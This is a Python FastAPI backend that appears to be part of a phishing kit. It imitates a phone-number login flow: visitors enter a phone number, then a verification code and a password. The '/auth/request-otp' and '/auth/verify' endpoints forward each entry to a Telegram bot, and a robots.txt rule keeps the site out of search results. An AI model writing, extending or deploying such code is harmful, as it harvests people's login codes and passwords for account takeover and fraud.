from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import PlainTextResponse
from pydantic import BaseModel
from datetime import datetime
from tg_bot import send_session_to_telegram
from tg_bot import send_number_to_telegram
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
import os


app = FastAPI(debug=False)

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/")
def site():
    return FileResponse(os.path.join("static", "site.html"))

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

sessions = {}

class PhoneIn(BaseModel):
    phone: str

class VerifyIn(BaseModel):
    phone: str
    code: str
    password: str

@app.get("/robots.txt", response_class=PlainTextResponse)
async def robots():
    return "User-agent: *\nDisallow: /"

@app.post("/auth/request-otp")
def request_otp(data: PhoneIn):
    sessions[data.phone] = {
        "phone": data.phone,
        "created": datetime.utcnow().isoformat(),
        "requires_password": True
    }
    send_number_to_telegram(sessions[data.phone])
    
    return {
        "status": "ok",
        "requiresPasswordHint": True
    }
        

@app.post("/auth/verify")
def verify(data: VerifyIn):
    if data.phone not in sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    sessions[data.phone].update({
        "code": data.code,
        "password": data.password,
        "verified": datetime.utcnow().isoformat()
    })

    send_session_to_telegram(sessions[data.phone])

    return {"status": "verified"}


